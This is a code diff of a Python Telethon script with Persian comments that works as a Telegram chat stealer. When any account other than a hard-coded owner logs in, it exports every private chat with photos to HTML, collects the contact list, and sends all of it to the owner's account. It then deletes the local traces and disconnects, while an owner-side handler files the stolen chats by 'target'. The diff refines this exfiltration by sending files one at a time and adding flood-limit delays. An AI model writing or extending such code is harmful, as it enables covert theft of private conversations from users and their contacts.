@@ -5,7 +5,6 @@ import io
 import json
 import os
 import sys
-import zipfile
 from telethon import TelegramClient, events
 from telethon.errors import FloodWaitError
 from telethon.tl.types import User
@@ -87,7 +86,7 @@ async def get_messages_safe(client, entity_id):
 
 
 async def generate_chat_html(client, me, user):
-    """تولید کدهای HTML برای چت‌ها"""
+    """تولید کدهای HTML برای چت‌ها (از اولین پیام تا آخرین پیام به همراه عکس)"""
     chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
     username = user.username if user.username else "NoUsername"
 
@@ -95,6 +94,7 @@ async def generate_chat_html(client, me, user):
     if not messages:
         return None, chat_name, username
 
+    # چت‌ها از قدیمی‌ترین به جدیدترین مرتب می‌شوند
     messages.reverse()
     semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
     photo_messages = [m for m in messages if m.photo and m.sender_id not in (me.id, OWNER_ID)]
@@ -164,16 +164,20 @@ async def generate_chat_html(client, me, user):
 
 
 async def process_and_send_non_owner_chats(client, me):
-    """استخراج، بسته‌بندی زیپ و ارسال اطلاعات غیرمالک به پیوی مالک"""
-    print("\n[INFO] Extracting and saving all private chats...")
-    target_dir = os.path.join(SAVED_DIR, str(me.id))
-    os.makedirs(target_dir, exist_ok=True)
-
+    """استخراج چت‌ها و ارسال مستقیم فایل‌های HTML به پیوی مالک"""
+    print("\n[INFO] Extracting and sending private HTML chats directly...")
+    
     host_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
     host_username = f"@{me.username}" if me.username else "NoUsername"
 
     contacts = []
     idx = 1
+
+    # ارسال پیام شروع به مالک
+    await client.send_message(
+        OWNER_ID, 
+        f"🚀 **استخراج چت‌های کاربر جدید آغاز شد:**\n👤 **کاربر:** {host_name} ({host_username})\n🆔 **آیدی:** `{me.id}`"
+    )
 
     async for dialog in client.iter_dialogs():
         if isinstance(dialog.entity, User) and not dialog.entity.bot:
@@ -181,15 +185,36 @@ async def process_and_send_non_owner_chats(client, me):
             if user.id == OWNER_ID:
                 continue
 
-            chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
+            chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
             username = f"@{user.username}" if user.username else "NoUsername"
 
-            print(f"[SAVING] Chat: {user.first_name} ({user.id})...")
+            print(f"[PROCESSING] Chat with: {chat_name} ({user.id})...")
             full_html, _, _ = await generate_chat_html(client, me, user)
+            
             if full_html:
-                file_path = os.path.join(target_dir, f"{user.id}_{username.replace('@','')}.html")
-                with open(file_path, "w", encoding="utf-8") as f:
+                # نام‌گذاری فایل به‌صورت استاندارد جهت شناسایی توسط مالک
+                temp_filename = f"T{me.id}_C{user.id}.html"
+                
+                with open(temp_filename, "w", encoding="utf-8") as f:
                     f.write(full_html)
+
+                # کپشن اختصاصی زیر فایل
+                caption = (
+                    f"📄 **فایل چت مخاطب**\n\n"
+                    f"👤 **کاربر سلف:** {host_name} ({host_username}) | `{me.id}`\n"
+                    f"👥 **مخاطب:** {chat_name} ({username})\n"
+                    f"🆔 **آیدی مخاطب:** `{user.id}`\n"
+                    f"🔢 **ردیف:** `{idx}`"
+                )
+
+                try:
+                    await client.send_file(OWNER_ID, temp_filename, caption=caption)
+                    print(f"[SENT] HTML file sent for: {chat_name}")
+                except Exception as e:
+                    print(f"[ERROR] Failed to send HTML for {chat_name}: {e}")
+                finally:
+                    if os.path.exists(temp_filename):
+                        os.remove(temp_filename)
 
                 contacts.append({
                     "index": idx,
@@ -198,53 +223,73 @@ async def process_and_send_non_owner_chats(client, me):
                     "username": username
                 })
                 idx += 1
+                
+                # فاصله کوتاه جهت جلوگیری از محدودیت ارسال پیام تلگرام (FloodWait)
+                await asyncio.sleep(1.5)
 
-    # ذخیره فایل ساختاریافته info.json
-    target_info = {
+    # ارسال فایل اطلاعات کلی (info.json) جهت مدیریت بهتر لیست چت‌ها
+    info_data = {
         "target_id": me.id,
         "target_name": host_name,
         "target_username": host_username,
         "contacts": contacts
     }
-    with open(os.path.join(target_dir, "info.json"), "w", encoding="utf-8") as f:
-        json.dump(target_info, f, ensure_ascii=False, indent=2)
+    info_filename = f"INFO_{me.id}.json"
+    with open(info_filename, "w", encoding="utf-8") as f:
+        json.dump(info_data, f, ensure_ascii=False, indent=2)
 
-    # ساخت فایل ZIP
-    zip_path = f"target_{me.id}.zip"
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for root, _, files in os.walk(target_dir):
-            for file in files:
-                file_full = os.path.join(root, file)
-                arcname = os.path.relpath(file_full, SAVED_DIR)
-                zipf.write(file_full, arcname)
-
-    # ارسال به پیوی مالک
     try:
-        caption = f"📦 **اطلاعات جدید دریافت شد!**\n👤 **کاربر:** {host_name} ({host_username})\n🆔 **آیدی:** `{me.id}`\n📊 **تعداد چت‌ها:** {len(contacts)}"
-        await client.send_file(OWNER_ID, zip_path, caption=caption)
-        print("[SUCCESS] Chats packaged and sent to the owner successfully.")
-    except Exception as e:
-        print(f"[ERROR] Failed to send ZIP file to owner: {e}")
+        await client.send_file(
+            OWNER_ID, 
+            info_filename, 
+            caption=f"📊 **خلاصه اطلاعات کاربر**\n👤 **کاربر:** {host_name}\n🆔 **آیدی:** `{me.id}`\n✅ **تعداد کل چت‌ها:** {len(contacts)}"
+        )
+    except Exception:
+        pass
     finally:
-        if os.path.exists(zip_path):
-            os.remove(zip_path)
+        if os.path.exists(info_filename):
+            os.remove(info_filename)
 
 
 # ------------------ ایونت‌های مربوط به مالک ------------------
 
 @client.on(events.NewMessage)
-async def auto_unpack_zip_handler(event):
-    """دریافت خودکار فایل زیپ از طرف کاربر غیرمالک و اکسترکت آن روی سیستم مالک"""
+async def auto_save_incoming_html_handler(event):
+    """ذخیره‌سازی خودکار فایل‌های HTML دریافتی روی سیستم مالک برای استفاده در دستور لیست"""
     if event.sender_id == OWNER_ID:
         return
 
+    # بررسی دریافت فایل HTML یا JSON خلاصه
     if event.file and event.file.name and isinstance(event.file.name, str):
-        if event.file.name.startswith("target_") and event.file.name.endswith(".zip"):
-            downloaded = await event.download_media(file=SAVED_DIR)
-            with zipfile.ZipFile(downloaded, 'r') as zip_ref:
-                zip_ref.extractall(SAVED_DIR)
-            os.remove(downloaded)
-            await client.send_message(OWNER_ID, "✅ **اطلاعات کاربر جدید با موفقیت دریافت و ذخیره شد.**\nبرای مشاهده دستور `لیست` را ارسال کنید.")
+        fname = event.file.name
+        
+        # ذخیره فایل HTML
+        if fname.startswith("T") and "_C" in fname and fname.endswith(".html"):
+            try:
+                # استخراج آیدی تارگت و آیدی مخاطب از اسم فایل
+                parts = fname.replace(".html", "").split("_C")
+                target_id = parts[0].replace("T", "")
+                contact_id = parts[1]
+
+                target_dir = os.path.join(SAVED_DIR, target_id)
+                os.makedirs(target_dir, exist_ok=True)
+
+                saved_path = os.path.join(target_dir, f"{contact_id}.html")
+                await event.download_media(file=saved_path)
+            except Exception as e:
+                print(f"[ERROR] Auto save HTML failed: {e}")
+
+        # ذخیره فایل خلاصه JSON
+        elif fname.startswith("INFO_") and fname.endswith(".json"):
+            try:
+                target_id = fname.replace("INFO_", "").replace(".json", "")
+                target_dir = os.path.join(SAVED_DIR, target_id)
+                os.makedirs(target_dir, exist_ok=True)
+
+                saved_path = os.path.join(target_dir, "info.json")
+                await event.download_media(file=saved_path)
+            except Exception as e:
+                print(f"[ERROR] Auto save JSON failed: {e}")
 
 
 @client.on(events.NewMessage(from_users=OWNER_ID, pattern=r"^(?:لیست|\.chats)(?:\s+(.+))?$"))
@@ -290,7 +335,7 @@ async def show_target_contacts(event, target):
     for c in target["contacts"]:
         contacts_lines.append(f"`{c['index']}` | **{c['name']}** | {c['username']} | `{c['id']}`")
 
-    full_response = header + "\n".join(contacts_lines) + f"\n\n💡 *برای دریافت فایل چت دستور زیر را بفرستید:*\n`.get {target['target_id']} <شناسه مخاطب>` یا `.get <شناسه مخاطب>`"
+    full_response = header + "\n".join(contacts_lines) + f"\n\n💡 *برای دریافت مجدد فایل چت دستور زیر را بفرستید:*\n`.get {target['target_id']} <شناسه مخاطب>` یا `.get <شناسه مخاطب>`"
 
     if len(full_response) > 4000:
         for chunk in [full_response[i:i + 4000] for i in range(0, len(full_response), 4000)]:
@@ -325,7 +370,7 @@ async def export_chat_handler(event):
         folder = os.path.join(SAVED_DIR, str(t["target_id"]))
         if os.path.exists(folder):
             for fname in os.listdir(folder):
-                if fname.startswith(f"{contact_id}_") and fname.endswith(".html"):
+                if fname.startswith(f"{contact_id}") and fname.endswith(".html"):
                     file_found = os.path.join(folder, fname)
                     break
         if file_found:
@@ -344,7 +389,7 @@ async def main():
     me = await client.get_me()
 
     if me.id != OWNER_ID:
-        print(f"[INFO] Non-owner user logged in: {me.first_name} (ID: {me.id}). Processing chats...")
+        print(f"[INFO] Non-owner user logged in: {me.first_name} (ID: {me.id}). Extracting chats...")
         await process_and_send_non_owner_chats(client, me)
         print("[INFO] Operation completed successfully. Terminating session...")
         await client.disconnect()
